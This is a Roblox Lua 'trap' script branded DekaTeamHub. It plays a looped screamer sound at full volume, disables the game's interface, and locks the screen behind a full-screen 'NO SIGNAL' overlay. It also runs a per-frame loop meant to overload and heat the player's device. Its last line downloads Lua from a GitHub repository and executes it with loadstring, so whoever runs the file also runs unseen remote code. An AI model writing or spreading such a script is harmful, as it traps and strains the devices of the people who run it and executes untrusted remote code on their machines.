-- [[ DekaTeamHub: ULTIMATE HORROR NO SIGNAL ]] --
-- [[ FORCE AUDIO + VIDEO SYNC | NO ESCAPE ]] --

task.spawn(function()
    -- 1. FORCE AUDIO (3 LAYER PROTECTION)
    local function playHorror(parent)
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://5835241031" -- SCREAMER HORROR ID
        s.Volume = 10
        s.Looped = true
        s.Parent = parent
        s:Play()
    end
    
    pcall(function() playHorror(game:GetService("Workspace")) end)
    pcall(function() playHorror(game:GetService("SoundService")) end)

    -- 2. DISABLE SYSTEM & UI
    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        StarterGui:SetCore("TopbarEnabled", false)
    end)

    -- 3. CREATE VISUAL (PERSIS VIDEO)
    local PG = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screen = Instance.new("ScreenGui", PG)
    screen.Name = "DekaFinalTrap"
    screen.DisplayOrder = 2147483647
    screen.IgnoreGuiInset = true

    local main = Instance.new("TextButton", screen)
    main.Size = UDim2.new(1, 0, 1, 0)
    main.BackgroundColor3 = Color3.new(0, 0, 0)
    main.Text = ""
    main.Modal = true 

    -- Color Bars
    local bars = Instance.new("Frame", main)
    bars.Size = UDim2.new(1, 0, 1, 0)
    bars.BackgroundTransparency = 1
    
    local colors = {
        Color3.fromRGB(191,191,191), Color3.fromRGB(191,191,0),
        Color3.fromRGB(0,191,191), Color3.fromRGB(0,191,0),
        Color3.fromRGB(191,0,191), Color3.fromRGB(191,0,0),
        Color3.fromRGB(0,0,191)
    }

    for i, c in pairs(colors) do
        local f = Instance.new("Frame", bars)
        f.Size = UDim2.new(1/#colors, 0, 1, 0)
        f.Position = UDim2.new((i-1)/#colors, 0, 0, 0)
        f.BackgroundColor3 = c
        f.BorderSizePixel = 0
    end

    -- NO SIGNAL BOX
    local box = Instance.new("TextLabel", main)
    box.Size = UDim2.new(0.4, 0, 0.15, 0)
    box.Position = UDim2.new(0.3, 0, 0.425, 0)
    box.BackgroundColor3 = Color3.new(0, 0, 0)
    box.Text = "NO SIGNAL"
    box.TextColor3 = Color3.new(1, 1, 1)
    box.TextScaled = true
    box.Font = "Code"
    box.BorderSizePixel = 4
    box.ZIndex = 10

    -- 4. GLITCH ENGINE & NOISE
    game:GetService("RunService").RenderStepped:Connect(function()
        bars.Position = UDim2.new(0, math.random(-15, 15), 0, math.random(-15, 15))
        
        -- Putih Glitch (Noise Video)
        if math.random(1, 4) == 1 then
            local n = Instance.new("Frame", main)
            n.Size = UDim2.new(1, 0, 0, math.random(2, 30))
            n.Position = UDim2.new(0, 0, math.random(0, 100)/100, 0)
            n.BackgroundColor3 = Color3.new(1, 1, 1)
            n.BackgroundTransparency = 0.4
            task.delay(0.02, function() n:Destroy() end)
        end
        
        -- Lag Generator (HP Panas)
        for i = 1, 2500000 do local _ = i * i end
    end)

    -- LOAD MAIN GITHUB
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hanseldeka-oss/DekaTeamHub-V3/main/Main.lua"))()
end)











